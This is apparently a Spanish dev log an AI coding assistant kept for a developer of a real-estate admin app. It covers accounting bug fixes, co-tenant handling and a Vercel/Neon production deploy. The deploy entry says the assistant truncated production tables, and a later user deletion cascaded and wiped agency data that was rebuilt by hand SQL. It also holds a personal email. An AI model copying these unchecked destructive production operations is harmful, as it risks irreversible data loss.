**Total del recibo desde ledger items**: el `movimiento.amount` para split es la comisión, no el total pagado. Calcular el total sumando los ledger items es lo correcto porque ahí viven los conceptos reales con sus montos exactos. El mismo dato ya existía, solo faltaba usarlo bien.

**KPIs desde la API, no el frontend**: los cálculos de bruto/a_liquidar/neto requieren conocer el `tipoFondo` y `categoria` de cada movimiento. Hacerlo en el servidor centraliza esa lógica y el frontend solo muestra.

**`cashMovementId` como puente**: el ledger no tiene referencia directa al comprobante del propietario. El `cashMovementId` actúa como ese puente — el ledger guarda el reciboNumero, la API busca el movimiento de caja correspondiente, y ese ID es lo que necesita la URL del comprobante.

---

### Conceptos que aparecieron

- **Modalidad split**: el inquilino hace dos transferencias simultáneas — una al propietario y otra a la inmobiliaria. La agencia solo registra lo que le corresponde (la comisión), no el total.
- **tipoFondo**: campo en `cash_movement` que indica a quién pertenece el dinero: `"agencia"` (plata de la inmobiliaria) o `"propietario"` (plata en tránsito del dueño).
- **Double-counting**: contar el mismo dinero dos veces porque aparece en dos registros diferentes (alquiler agencia + ingreso_inquilino propietario son el mismo flujo visto desde dos ángulos).
- **Env vars en Next.js**: `.env` es el archivo base. `.env.local` lo sobreescribe y nunca se sube a git. Se usa para que el entorno local apunte a la base de datos de dev, no producción.
- **Neon branches**: la DB de producción y dev son "ramas" de la misma base de datos. Se puede hacer `reset_from_parent` para copiar producción a dev. El endpoint de conexión cambia según la rama.
- **cashMovementId como puente entre ledger y comprobante**: el ledger no sabe nada del comprobante del propietario. La API de la cuenta corriente del propietario hace la búsqueda inversa: reciboNumero → movimiento de caja → ID del comprobante.

---

### Preguntas para reflexionar

1. ¿Por qué en Modalidad A se crean 3 movimientos pero en split solo 1? ¿Qué representa cada uno de los 3 de Modalidad A desde el punto de vista contable?
2. Si mañana quisieras saber cuánto le debes liquidar a un propietario sin mirar la cuenta corriente, ¿qué movimientos de caja tendrías que sumar y restar?

---

### Qué debería anotar en Obsidian

- [ ] Concepto: **Modalidad split en inmobiliaria** — dos transferencias directas del inquilino, la agencia solo registra su comisión
- [ ] Patrón: **tipoFondo como separación de fondos en caja** — "agencia" vs "propietario" evita el double-counting en los KPIs
- [ ] Bug: **KPIs de caja con doble conteo** — causa (sum de todos los income sin filtrar tipoFondo), fix (filtrar por agencia para bruto, propietario para en tránsito)
- [ ] Decisión técnica: **cashMovementId como puente ledger → comprobante** — por qué el ledger no linkea directo y cómo la API hace la búsqueda

---

## 2026-05-08 — Fix de signos en la liquidación (comprobante)

### Qué hice

**Bug**: En la liquidación del propietario, los ítems de tipo `descuento` o `bonificacion` aparecían como suma positiva en las columnas BRUTO y NETO, cuando deberían aparecer como resta negativa. Además los honorarios (comisión de la inmobiliaria) tampoco tenían signo negativo, haciendo que la aritmética de la tabla no fuera obvia.

**Fix en `src/lib/comprobantes/load.ts`**:
- Agregué `tipo` al tipo `ComprobanteData["items"]` para que la página sepa con qué tipo de movimiento está trabajando
- Introduje un multiplicador de signo: `sign = -1` si el tipo es `descuento` o `bonificacion`, `sign = 1` para el resto
- `bruto` y `net` se multiplican por `sign` → descuentos salen negativos
- `commission` se multiplica por `-sign` → honorarios siempre negativos (representan una deducción de lo que recibe el propietario)
- Los totales acumulan valores ya signados, así que quedan correctos automáticamente

**Fix en `src/app/(dashboard)/comprobantes/[id]/page.tsx`**:
- Color rojo (`#dc2626`) cuando BRUTO o NETO son negativos
- Color azul (`#2563eb`) en toda la columna de honorarios cuando hay valor
- Misma lógica de color en la fila de Totales

**Fix en `src/lib/receipts/email-template.ts`** (sesión anterior, completado):
- El logo de la agencia (guardado como base64 data URL) ya se renderiza en el email HTML con un `<img>` antes del nombre de la agencia

---

### Por qué lo hice así y no de otra forma

**El signo va en `load.ts`, no en la página**: la regla de negocio ("un descuento resta") pertenece a la capa de datos, no al presentador. Si en el futuro se genera un PDF o se manda el comprobante por email, los números llegan ya correctos sin repetir la lógica.

**`commission = -(rawCommission * sign)`**: los honorarios son siempre negativos desde el punto de vista del propietario — es plata que la agencia retiene. Mostrarlos negativos hace que la aritmética de la tabla sea evidente: BRUTO + HONORARIOS + NETO no necesita explicación. Para descuentos, la comisión ya era 0, negarlo sigue siendo 0 — sin efecto colateral.

**Color en la página y no en variables CSS**: estos colores son de estado de negocio específicos de la liquidación (negativo = resta, azul = honorarios), no colores de tema. Usar hex directos (`#dc2626`, `#2563eb`) los mantiene aislados y no contamina el sistema de diseño general.

---

### Conceptos que aparecieron

- **Multiplicador de signo**: en lugar de tener condiciones `if` esparcidas, se define `sign = ±1` una sola vez y se multiplica. Todos los derivados (`bruto`, `commission`, `net`) heredan el signo automáticamente.
- **Base64 data URL en email**: las imágenes en email HTML no pueden referenciar archivos del servidor (los clientes de email no hacen fetch autenticado). Si el logo está guardado como `data:image/png;base64,...`, el `src` del `<img>` funciona directamente sin necesidad de una URL pública.
- **Capa de presentación vs. capa de datos**: la misma distinción que "modelo vs. vista". Cuando una regla de negocio (como el signo de un descuento) está en la capa de datos, todos los presentadores (pantalla, PDF, email) la heredan sin esfuerzo extra.

### Preguntas para reflexionar

1. ¿Por qué es importante que `commission` sea negativo incluso cuando el `bruto` del ítem también es negativo (descuento)?
2. Si guardar montos positivos en la DB es la convención, ¿cómo sabés cuándo aplicar el signo negativo al mostrarlos?

### Qué debería anotar en Obsidian

- [ ] Patrón: **Multiplicador de signo** — definir `sign = ±1` según el tipo y multiplicar todos los valores derivados, en lugar de condicionales dispersos
- [ ] Bug: **Descuentos sumando en lugar de restar en liquidación** — causa raíz (load.ts no consideraba `tipo` al calcular bruto/neto), fix (sign multiplier + negar commission)
- [ ] Concepto: **Base64 data URL en emails HTML** — por qué funciona para logos en lugar de URLs externas

---

## 2026-05-07 — Fix de días de gracia en punitorios

### Qué hice

**Bug**: el contrato de Paggi tiene día de pago = 1 y 10 días de gracia, lo que significa que la mora empieza recién el día 11. El sistema generaba punitorios desde el día 1 porque ignoraba los días de gracia por completo.

**Fix en el backend** (`src/lib/ledger/mora.ts` y `cuenta-corriente/route.ts`):
- `calcDaysMora()` ahora acepta un parámetro opcional `graceDays` que desplaza la fecha efectiva de mora
- El filtro SQL que detecta alquileres vencidos pasó de `dueDate < hoy` a `dueDate + graceDays < hoy`
- El cálculo de días de mora en el loop de punitorios usa `graceDays = 0` si ya hubo un pago parcial (porque el período de gracia ya había pasado cuando se hizo el pago)
- Los KPIs (capital en mora, intereses) también respetan los días de gracia
- Se agregó un paso de auto-limpieza: en cada carga de página, el sistema cancela automáticamente punitorios generados incorrectamente para inquilinos que aún están en período de gracia

**Fix en el frontend** (`src/components/tenants/ledger-table.tsx`):
- Nuevo helper `isEffectivelyOverdue()` que considera los días de gracia al determinar si una entrada está en mora
- `getDueDateSubtext()` ahora muestra "X días de gracia" o "Último día de gracia" en lugar de "X días de mora" cuando el inquilino está dentro del período de tolerancia
- Las filas en período de gracia ya no se pintan de rojo ni se clasifican como "en mora" en los filtros

---

### Por qué lo hice así y no de otra forma

**Auto-limpieza en el GET**: en lugar de migrar datos, el sistema se auto-sana en cada carga. Así funciona aunque haya datos históricos incorrectos — no hay que correr un script por separado.

**`graceDays = 0` con pago parcial**: si alguien hizo un pago parcial, la mora del saldo restante corre desde la fecha de ese pago (no desde el vencimiento original + gracia). El período de gracia ya estaba vigente cuando se hizo el pago; aplicarlo otra vez sería incorrecto.

**Dos capas del mismo bug**: el backend generaba mal los punitorios Y el frontend coloreaba mal las filas. Cada capa tenía su propia lógica de "¿está en mora?", duplicada y sin gracia. El fix tuvo que ir en las dos. La lección: cuando una regla de negocio aparece en dos lugares, conviene centralizarla.

---

### Conceptos que aparecieron

- **Período de gracia**: días de tolerancia después del vencimiento antes de que empiece a correr la mora. Es un concepto contractual argentino común — el inquilino tiene X días extra sin penalización.
- **Auto-limpieza (self-healing)**: patrón donde el sistema corrige sus propios datos incorrectos al ejecutarse, sin necesidad de scripts de migración. Funciona bien cuando la corrección es barata y no tiene efectos secundarios.
- **Dato compuesto (dueDate + graceDays)**: la fecha efectiva de mora no está guardada en la DB — se computa combinando dos campos. Cada vez que se necesita saber "¿está en mora?", hay que usar los dos. Si solo usás uno, el resultado es incorrecto.

### Preguntas para reflexionar

1. ¿Cuándo conviene corregir datos mediante auto-limpieza en el GET versus un script de migración que corra una sola vez?
2. ¿Por qué el período de gracia no aplica una segunda vez cuando hay pago parcial?

### Qué debería anotar en Obsidian

- [ ] Bug: **Punitorios ignoraban días de gracia** — causa raíz (lógica duplicada en backend y frontend sin considerar `graceDays`), fix (calcDaysMora con parámetro + SQL `dueDate + graceDays < hoy` + auto-limpieza), dónde mirar si vuelve (`mora.ts`, `cuenta-corriente/route.ts`, `ledger-table.tsx`)
- [ ] Patrón: **Self-healing en GET** — corregir datos incorrectos como efecto secundario de una lectura, evita scripts de migración

---

## 2026-05-07 — Co-inquilinos, cuenta corriente compartida y mejoras de UI

### Qué hice

**1. Agrupación de co-inquilinos en la lista de inquilinos**
Implementé el sistema de grupos de inquilinos (vía subagent-driven development, 3 tareas):
- Nuevo archivo `src/lib/tenants/grouping.ts` con funciones puras `groupTenants()` y `resolveGroupEstado()`
- La ruta `/api/tenants` ya no filtra por nombre en la DB (para que buscar por el nombre del co-inquilino encuentre todo el grupo), sino que agrupa los resultados en memoria
- `tenants-list.tsx` muestra una fila expandible por grupo: el inquilino principal más visible, los co-inquilinos aparecen al desplegar

**2. Fix de orden del inquilino principal**
Paggi Malena debía ser la principal pero aparecía Guido porque ambos tenían exactamente el mismo timestamp en `contract_participant.createdAt` (habían sido creados en el mismo seed). Agregué el `client.createdAt` como segundo criterio de ordenamiento — primero se compara cuándo fue agregado al contrato, y si es igual, cuándo fue creado el cliente.

**3. Cuenta corriente compartida entre co-inquilinos**
Un co-inquilino que entra a su ficha ahora ve los mismos movimientos que el inquilino principal. Antes el filtro de la DB era solo `inquilinoId = yo`, ahora es `inquilinoId = yo OR contratoId = contrato-compartido`.

**4. Simplificación de filtros en cuenta corriente**
Reemplazé los 4 filtros independientes (En mora / Pendientes / Pagados / Futuros) por 3 exclusivos (Pagados / Presentes / Futuros), con "Presentes" como valor por defecto. "Presentes" agrupa todo lo pendiente y en mora — que es lo que se quiere ver normalmente.

**5. Fix del diálogo de confirmación de cobro**
El total del recibo era incorrecto cuando había descuentos: el código sumaba todos los montos como positivos. Agregué `getSignedMonto()` que devuelve negativo cuando el tipo es `descuento` o `bonificacion`.

**6. Formato de moneda en vivo en el diálogo de detalle**
El campo "Monto ($)" ahora formatea al tipear: puntos de miles y coma decimal al estilo argentino. Al guardar, el parser deshace el formato para enviar un número limpio al servidor.

**7. Campos de fecha en el diálogo de detalle de movimiento**
- Agregué campo "Fecha de período" editable (formato MM-YYYY)
- Cambié "Fecha de vencimiento" a formato DD-MM-YYYY (se convierte automáticamente al guardar)
- Ambos campos insertan el guión automáticamente al tipear solo dígitos

---

### Por qué lo hice así y no de otra forma

**Búsqueda en memoria (no en DB)**: si el filtro de búsqueda estuviera en la DB, buscar "Malena" encontraría solo la fila de Malena, sin Guido ni el grupo completo. Mover la búsqueda a después de la agrupación garantiza que siempre se devuelva el grupo entero.

**OR con contratoId**: el filtro alternativo podría haber sido copiar los movimientos a ambos inquilinos en la DB, pero eso crea duplicados. Un OR en la query es más limpio — un solo registro, leído por dos inquilinos distintos.

**ToggleGroup single**: los 3 filtros de cuenta corriente son excluyentes (no tiene sentido ver Pagados + Futuros al mismo tiempo), así que `type="single"` es el modelo correcto; antes era `type="multiple"` que permitía cualquier combinación.

---

### Conceptos que aparecieron

- **Subagent-driven development**: patrón donde cada tarea del plan se delega a un sub-agente fresco (sin memoria del contexto previo) y pasa por dos revisiones: ¿cumple la especificación? y ¿tiene buena calidad de código? Reduce el riesgo de acumulación de deuda técnica por contexto contaminado.
- **Tiebreaker de ordenamiento**: cuando dos filas tienen el mismo valor en el criterio principal, se necesita un segundo (y tercero) criterio para que el orden sea determinista. Sin él, el orden puede cambiar entre ejecuciones.
- **OR filter en Drizzle**: `or(eq(tabla.campoA, valorA), eq(tabla.campoB, valorB))` — permite matchear filas que cumplan cualquiera de las dos condiciones.
- **Monto con signo**: el estilo de guardar valores positivos en la DB y aplicar el signo en la lógica de negocio es más flexible — el mismo registro puede interpretarse de distinta forma según el contexto (liquidación, recibo, total).

### Preguntas para reflexionar

1. ¿Por qué conviene guardar los montos siempre positivos en la base de datos y manejar el signo en código, en lugar de guardarlos negativos directamente?
2. ¿Qué desventaja tendría hacer el filtro de búsqueda de inquilinos en la DB en lugar de en memoria?

### Qué debería anotar en Obsidian

- [ ] Patrón: **Subagent-Driven Development** — sub-agente por tarea + revisión spec + revisión calidad, sin contaminar el contexto del agente coordinador
- [ ] Concepto: **OR filter en Drizzle ORM** — `or(eq(...), eq(...))` para matchear cualquiera de dos condiciones
- [ ] Bug: **Orden no determinista por timestamps iguales** — causa raíz (seed creó dos registros en el mismo instante), fix (segundo criterio de ordenamiento: `client.createdAt`)
- [ ] Concepto: **Montos con signo en lógica de negocio** — BD guarda positivo, el código aplica `getSignedMonto()` según el tipo del movimiento

---

## 2026-05-07 — Flujo de trabajo, base de datos de dev y fix de descuento

### Qué hice

**1. Fix: descuento se sumaba en lugar de restarse**
El monto de los descuentos se guarda en la DB como número positivo (ej: `43825`). El código de `cobro-panel.tsx` y `receipts/emit/route.ts` lo sumaba igual que un alquiler, dando totales incorrectos (`$800.000 + $43.825 = $843.825` en lugar de `$756.175`). Agregué `getSignedMonto()` / `getSignedEffectiveAmount()` que devuelve negativo cuando el tipo es `descuento` o `bonificacion`. El fix está en dos lugares: la pantalla (UI) y el servidor (lo que se graba en caja).

**2. Configuración del flujo de trabajo local → producción**
- Corregí el email de git: estaba `arce.guillermo.gaston@email.com` (typo), lo cambié a `@gmail.com`. Vercel bloqueaba los deploys porque no podía asociar el committer con la cuenta de GitHub.
- Configuré `personal` (repo `Montaigne252/arce-administracion`) como remote por defecto para que `git push` apunte a Vercel.

**3. Rama de base de datos para desarrollo**
Creé la rama `dev` en Neon (copiada exactamente de producción en ese momento). Actualicé el `.env` local para apuntar a esa rama. Ahora local y producción tienen bases de datos separadas.

---

### Guía de trabajo autónomo (sin ayuda de Claude)

#### Flujo de cada sesión

```
1. Abrís la terminal en el proyecto
2. bun dev                    ← arranca el servidor local
3. Abrís localhost:3000 en el navegador
4. Hacés cambios en el código → se ven al instante en el navegador (sin tocar git)
5. Cuando algo funciona:
   git add src/el/archivo/que/cambiaste.tsx
   git commit -m "descripción breve de lo que hiciste"
6. Repetís 4-5 las veces que haga falta
7. Cuando todo está probado y listo para producción:
   git push                   ← esto sí deploya en Vercel (~1-2 minutos)
```

#### Resetear la base de datos local (datos frescos de producción)

Cuando querés que tu base local sea una copia exacta de lo que hay en producción en ese momento, pedíselo a Claude: *"reseteá la rama dev"*. Claude lo hace con el MCP de Neon en segundos. No hay comando manual para esto — requiere autenticación.

#### Si Vercel bloquea un deploy

Causa más común: el email de git no coincide con GitHub. Verificar con:
```bash
git config user.email
# debe decir: arce.guillermo.gaston@gmail.com
# si dice otra cosa:
git config user.email "arce.guillermo.gaston@gmail.com"
# luego hacer un commit vacío para re-triggerear el deploy:
git commit --allow-empty -m "chore: trigger redeploy"
git push
```

#### Cuándo NO usar git push todavía

- Cuando el cambio rompe algo que todavía no arreglaste
- Cuando estás en medio de algo y querés guardar progreso parcial → usá `git commit` sin push

#### Cambios de estructura de base de datos (migraciones)

Si en alguna sesión se agrega una columna o tabla nueva al schema:
1. El cambio se aplica primero en la rama `dev` (local) con `bun run db:push`
2. Se prueba que funciona
3. Al momento de deployar, hay que aplicar el mismo cambio en producción — pedíselo a Claude, que lo hace con el DATABASE_URL de producción

---

### Conceptos que aparecieron

- **git add vs git commit vs git push**: `add` elige qué archivos incluir, `commit` guarda una foto local, `push` manda todo a GitHub y dispara el deploy. Son tres pasos separados, cada uno con su propósito.
- **Neon branches**: Neon permite tener copias de la misma base de datos (igual que git tiene ramas de código). La rama `main` es producción, la rama `dev` es para probar. Resetear `dev` copia `main → dev`, nunca al revés — no hay riesgo de contaminar producción.
- **Variables de entorno sensitivas**: Vercel oculta los valores una vez guardados. No es un bug, es seguridad — nadie que acceda al dashboard puede leer las claves.
- **Commit vacío**: `git commit --allow-empty` crea un commit sin cambios de código, útil para re-triggerear un deploy sin tener que modificar un archivo.

### Preguntas para reflexionar

1. ¿Por qué tiene sentido que el código y los datos vayan por caminos separados (git vs Neon)? ¿Qué problema crearía si fueran juntos?
2. ¿En qué situación sería peligroso hacer `git push` sin probar en local primero?

### Qué debería anotar en Obsidian

- [ ] Concepto: **git add / commit / push** — los tres pasos del workflow y para qué sirve cada uno
- [ ] Patrón: **Flujo local → staging → producción** con Vercel + Neon branches
- [ ] Bug: **Descuento sumado en lugar de restado** — causa raíz (monto positivo en DB, sin signo en la suma), fix (función `getSignedMonto`), dónde mirar si vuelve a pasar

---

## 2026-05-07 — Deploy a producción (Vercel)

### Qué hice

Ejecuté el primer deploy completo de Arce Administración a Vercel. El proceso incluyó:
- Limpié la DB de producción (Neon branch `production`): TRUNCATE de todas las tablas operacionales, preservando agencia y plantillas de contrato.
- Pushé el código al repo propio del usuario (`Montaigne252/arce-administracion`) para independizarse del repo del programador.
- Importé el proyecto en Vercel, configuré las 6 env vars de producción (DATABASE_URL, BETTER_AUTH_SECRET, BETTER_AUTH_URL, GMAIL_USER, GMAIL_APP_PASSWORD, CRON_SECRET) y deployé.
- Creé el Blob Store `arce-uploads` (Private, región São Paulo) y lo conecté al proyecto; redeploy para que `BLOB_READ_WRITE_TOKEN` tomara efecto.
- Resolví una cadena de problemas post-deploy: Gmail app password inválida (email de verificación no llegaba), rate limit por intentos fallidos, agencia en cascada borrada al eliminar el usuario original, documentTemplate vacío.
- Restauré la agencia con todos los datos via SQL directo en Neon, actualicé el `agencyId` del usuario, y sedeé el template de contrato con `scripts/seed-prod-template.ts`.

**URL de producción:** `https://arce-administracion.vercel.app`

### Por qué lo hice así y no de otra forma

- **Repo propio**: deployar con el repo del programador crea dependencia operacional. El usuario necesita control total del código en producción.
- **Blob Store Private**: los archivos (comprobantes, tareas) son datos privados del negocio — nunca deben ser públicamente accesibles por URL directa.
- **SQL directo para recuperar datos**: el seed script fallaba porque bun auto-carga el `.env` local (con DB de dev) y pisaba el DATABASE_URL seteado en PowerShell. La solución fue `--env-file NUL` para que bun no cargue ningún .env.

### Conceptos que aparecieron

- **Blob Store**: almacenamiento de archivos en la nube. Vercel Blob es el equivalente de "una carpeta en internet" con permisos; `Private` significa que cada archivo necesita un token para ser leído.
- **Cascade en FK**: cuando una tabla tiene una FK con `ON DELETE CASCADE`, borrar el registro padre borra automáticamente los hijos. Aquí: borrar el usuario borró la agencia, que borró el documentTemplate.
- **Rate limiting**: Better Auth bloquea temporalmente un IP/email después de varios intentos fallidos de login. Se limpia con `TRUNCATE "rateLimit"`.
- **BETTER_AUTH_URL**: Better Auth valida que los requests vengan del mismo origen que esta variable. Si el usuario accede por una URL diferente (ej: la URL del deploy específico en vez de la URL canónica), el login da 403.
- **dotenv y bun**: bun carga automáticamente el archivo `.env` al arrancar cualquier script, incluso sin `import "dotenv/config"`. Para evitarlo: `bun --env-file NUL`.

### Preguntas para reflexionar

1. ¿Por qué tiene sentido que borrar un usuario borre en cascada su agencia? ¿En qué casos eso podría ser un problema?
2. Si tuvieras que volver a hacer este deploy desde cero, ¿qué paso te parece más crítico no saltear?

### Qué debería anotar en Obsidian

- [ ] Concepto: **Foreign Key con CASCADE** — qué es, cuándo ayuda, cuándo destruye datos sin avisar
- [ ] Decisión técnica: **Por qué deployamos en Vercel + Neon** en lugar de Supabase u otras opciones
- [ ] Patrón: **Recuperar datos de producción borrados por cascade** — la receta SQL que usamos para reconstruir agency + agencyId + template

---

## 2026-05-07 — SEC-7 (preparación de deploy a Vercel)

### Qué hice

Última fase de la auditoría pre-deploy. SEC-7 era operacional + algo de código preparatorio para que el deploy real sea ejecutar la `docs/deploy-checklist.md`, no improvisar.

**Decisión de host: Vercel.** (Justificación al final de esta entrada.)

Cambios de código:

**1. Storage adapter** (`src/lib/uploads/storage.ts`) — refactorizado a interfaz `StorageAdapter` con dos implementaciones:
- `LocalStorageAdapter` — current filesystem behavior (`private-uploads/` local)
- `BlobStorageAdapter` — usa `@vercel/blob` SDK (instalado v2.3.3); pathname format `<scope>/<id>/<filename>`, `addRandomSuffix: false` para determinismo, error prefix `ENOENT:` para parity con la regex que el route handler ya usaba

Selección automática al cargar el módulo: si `BLOB_READ_WRITE_TOKEN` está seteado → Blob, si no → Local. El public API (`saveUpload`, `readUpload`, `deleteUpload`) no cambió — ningún caller necesita modificarse. Path traversal protection (regex de id/filename) sigue en ambos adapters.

**2. Cron migrado a Vercel Cron Jobs** (`vercel.json` + `src/instrumentation.ts`):
- `vercel.json` declara `crons: [{ path: "/api/cron/cleanup-files", schedule: "0 2 * * *" }]`. Vercel envía un request HTTP con `Authorization: Bearer ${CRON_SECRET}` — el endpoint ya validaba ese exact header desde SEC-1.
- `instrumentation.ts` skip-ea el registro de `node-cron` cuando `process.env.VERCEL` está seteado (Vercel lo setea automáticamente en runtime). En Railway/VPS/dev, el cron interno sigue funcionando.
- Net: una sola implementación en cada host, sin duplicación.

**3. `sendEmail` fail-fast en producción** (`src/lib/auth/email.ts`):
- Antes: si faltaban `GMAIL_USER` / `GMAIL_APP_PASSWORD`, logueaba un warning y retornaba void → silent failure.
- Ahora: en `NODE_ENV=production` tira `Error("...must be configured in production")` que el caller (`register/route.ts`) atrapa y rollbackea el user (cascade borra account).
- En dev sigue como warning para no romper flows locales sin Gmail config.

**4. Security headers** (`next.config.ts` § `headers()`):
- `Strict-Transport-Security: max-age=31536000; includeSubDomains` — fuerza HTTPS por 1 año (sin `preload` todavía, requiere submit a hstspreload.org y es difícil revertir).
- `X-Frame-Options: DENY` — anti-clickjacking, la app no se embebe.
- `X-Content-Type-Options: nosniff` — bloquea MIME sniffing.
- `Referrer-Policy: strict-origin-when-cross-origin` — no leak de path en cross-origin nav.
- `Permissions-Policy: camera=(), microphone=(), geolocation=()` — desactiva features que la app no necesita.

**5. `.env.example`** — documenta todas las env vars: required-always (DATABASE_URL, BETTER_AUTH_SECRET, BETTER_AUTH_URL), required-prod (GMAIL_USER, GMAIL_APP_PASSWORD, CRON_SECRET), Vercel-auto (BLOB_READ_WRITE_TOKEN), opcionales (NEXT_PUBLIC_*, GOOGLE_*). Con notas de cómo generar los secrets (`openssl rand -base64 32`) y cómo obtener Gmail app password.

**6. `.gitignore`** — agregué `!.env.example` para que `.env.example` se commitee (regla previa `.env*` lo bloqueaba).

**7. `docs/deploy-checklist.md`** — 8 fases (pre-requisitos, generar secrets, preparar Neon DB, crear Vercel Blob store, importar proyecto + setear env vars, primer deploy + verificación, smoke test E2E completo, custom domain opcional, runbook operacional). Smoke test cubre: registro + email verify, creación de inmobiliaria, ABM de cliente/propiedad, upload de archivo, cron manual, **test explícito de XSS resistance** (subir `.html` debe dar 400). Runbook incluye: rotar secrets, invalidar sesiones (panic button), correr cron manualmente, hotfix flow, rollback de deploy.

### Por qué Vercel y no las otras opciones

Tradeoff matrix evaluada:

| Host | Filesystem | Cron | Storage | Mental model | Costo | Setup |
|---|---|---|---|---|---|---|
| Vercel | read-only en runtime | Vercel Cron via vercel.json | Vercel Blob (paid, free tier 1GB) | Serverless functions (cold start, 10s default timeout) | Free tier robusto + pay-as-you-grow | git push deploys, 0 ops |
| Railway | persistent | `node-cron` interno OK | Filesystem local (con caveat de redeploys) | Long-running Node server | $5/mes mínimo | Setup mínimo, manual de envs |
| Self-hosted VPS | persistent | `node-cron` OK | Filesystem local | Linux box clásico | ~$5-20/mes (DO/Hetzner) | Setup completo (firewall, SSL, backups, etc.) |

**Por qué Vercel ganó** para este caso específico:

1. **Stack-fit**: Vercel es de los creadores de Next.js. Optimizaciones del framework (Turbopack, React Server Components, edge runtime) están testeadas y deployadas en Vercel primero. Cualquier feature nueva de Next.js anda en Vercel desde el día 1 — en otros hosts hay lag.

2. **DX para vos como solo dev / aprendiz**: el flujo es `git push → main → deploy automático`. Sin SSH, sin pm2, sin nginx config, sin Let's Encrypt manual. Cada PR genera un preview deploy con su URL para testear antes de mergear. Para un programador que está aprendiendo, eliminar 30 cosas que pueden salir mal es valor enorme.

3. **Free tier suficiente**: el Hobby plan da 100 GB-hours de function invocations/mes y 100 GB de bandwidth. Una inmobiliaria con tráfico orgánico (10-20 visitas/día) usa una fracción de eso. Vercel Blob free tier: 1 GB storage + 1 GB bandwidth/mes — suficiente para arrancar (eventualmente upgrade si los uploads crecen).

4. **Operacional outsourceado**: backups (Neon hace los suyos automáticos), HTTPS (Let's Encrypt automático), DDoS protection (built-in), CDN global, observability básica (Logs tab, Function metrics) — todo viene gratis. En VPS, cada uno de esos requiere setup explícito.

5. **Vector de fallos compartido**: si Vercel tiene un outage, tu app cae. PERO: el SLA de Vercel free es ~99.9% (~9 horas/año de downtime). Para una app de inmobiliaria donde el cliente abre el sistema 5 veces/semana, ese downtime es irrelevante. Self-hosted con vos como única persona-de-guardia probablemente tiene WORSE uptime (vacaciones, dormir, no-monitoreo).

6. **Path natural a escala**: si Arce crece a 10 inmobiliarias, Vercel escala automático (más functions). En VPS hay que escalar a mano (más instancias, load balancer, etc.).

**Por qué NO Railway**:

- Mental model más simple (es un Node server long-running) → más familiar si venís de hosting tradicional. Pero el aprendizaje técnico es similar al de Vercel para un proyecto Next.js.
- $5/mes mínimo vs Vercel free tier para tráfico bajo. Para una inmobiliaria recién arrancando, esa diferencia es real.
- No tiene el ecosystem cohesivo de Vercel (Cron Jobs, Blob Storage, Analytics todo en el mismo dashboard).

**Por qué NO VPS self-hosted**:

- Setup completo (firewall, SSL, backup automation, deploy automation, monitoring) es 10-20 horas de trabajo previo al primer deploy. Para un dev solo aprendiendo, ese tiempo se gasta mejor escribiendo features.
- Operacional ongoing: si la VPS se cuelga a las 3 AM, alguien tiene que rebootearla. En Vercel no aplica — auto-recovery.
- El control extra que da el VPS (custom kernel, software no-Node, etc.) acá no se usa. Costo sin beneficio.

**Trade-off aceptado**:
- **Filesystem read-only en runtime** → uploads van a Vercel Blob (extra dependency). El storage adapter ya está armado para esto.
- **Function timeout 10s en Hobby plan** → operaciones largas (generación de PDFs masivos, procesamiento de uploads grandes) podrían chocar. Hoy ninguna operación supera 2-3s. Si crece, upgrade a Pro ($20/mes) sube timeout a 60s.
- **Cold starts** (~1s) → primer request después de inactividad es más lento. Para una app de uso interno (no tráfico público alto), invisible.
- **Lock-in moderado** → el código está mayormente portable (Next.js es estándar), pero los pieces que dependen de `vercel.json` (cron) y `@vercel/blob` requerirían refactor si migra a otro host. El storage adapter pattern minimiza ese lock-in (cambiar el `BlobStorageAdapter` por `S3Adapter` es un solo archivo).

### Por qué fail-fast en sendEmail

El comportamiento previo (warning + return void si faltaban creds) era explotable como bug:
- En prod sin GMAIL config, `register/route.ts` insertaría el user, llamaría a `auth.api.sendVerificationEmail` que internamente llama `sendEmail`, que silently retorna sin throw.
- Better Auth no detecta el fallo (no hubo error)
- Register devuelve 201 al cliente
- El user nunca recibe email
- El user no puede verificar
- Si reintentan registrarse: 400 "Email already registered"
- Resultado: dead user en DB sin path para recuperar.

Fail-fast en prod corta este loop: el throw atrapa por el try/catch en `register/route.ts`, que rollbackea el user (cascade borra account). El cliente recibe 500 con mensaje claro. **Mejor un error visible que un éxito ficticio**.

En dev no aplica el fail-fast porque pretendemos que en local podés trabajar sin Gmail configurado (y el warning es suficiente para recordar setearlo).

### Por qué storage adapter pattern y no llamadas directas a `@vercel/blob`

Tres razones:

1. **Local dev sigue funcionando**: si reemplazara `fs.writeFile` directamente por `put()` de Vercel Blob, los devs locales necesitarían setear `BLOB_READ_WRITE_TOKEN` también. Innecesario.

2. **Tests E2E pueden usar filesystem**: `scripts/test-cross-agency.ts` corre contra un Neon ephemeral branch + bun dev local — si fuerzo Vercel Blob, el test necesita un store separado o mock. Con el adapter, el test usa filesystem y los uploads se escriben a `private-uploads/` que es ephemeral por test run.

3. **Future portability**: si en V2 migran a otro host (Cloudflare Workers, AWS Lambda, etc.) que tiene su propio object storage, agregás un tercer adapter sin tocar callers. La abstracción cuesta ~50 líneas de código y compra opciones.

### Conceptos que aparecieron

- **Adapter pattern**: misma interfaz pública, diferentes implementaciones intercambiables. Acá: `StorageAdapter` con `LocalStorageAdapter` y `BlobStorageAdapter`. La selección se hace por env (`BLOB_READ_WRITE_TOKEN` ? Blob : Local). El caller (`saveUpload`) ni se entera de cuál está activa.

- **Vercel Cron Jobs vs `node-cron`**: en serverless functions (Vercel/Lambda), las funciones son short-lived — `node-cron` registra una tarea que muere cuando termina la invocation. La solución es invertir: el host (Vercel) llama a un endpoint HTTP en horarios cron, autenticando con un secret. El endpoint es stateless, fácil de escalar.

- **Fail-fast vs fail-silent**: dos políticas para "qué hago si una dependencia falta". Fail-fast tira excepción visible — el caller decide. Fail-silent retorna como si todo estuviera OK — el bug aparece después, lejos del root cause. En auth flows (sensible), fail-fast siempre.

- **HSTS preload**: `Strict-Transport-Security` con `preload` directive le dice al browser de hardcoded-ear el dominio en la lista "always-HTTPS". Es difícil revertir (hay que esperar 6+ meses para que se quite de la lista de Chrome/Firefox). Por eso lo dejé sin `preload` en SEC-7 — agregar más adelante cuando esté consolidado el deploy.

- **Vercel free tier limits**: 100 GB-hours/mes (function execution time × memory), 100 GB bandwidth, 1 GB Blob storage. Para una app de uso interno con tráfico bajo, sobra. Saberlo evita "arrepentimiento" cuando el dashboard muestra el 5% usado y pensás que se va a romper.

- **`process.env.VERCEL`**: env var auto-seteada por Vercel en runtime. Útil para detectar "estoy corriendo en Vercel" sin un flag manual. Existe también `VERCEL_ENV` (production/preview/development) para más granularidad.

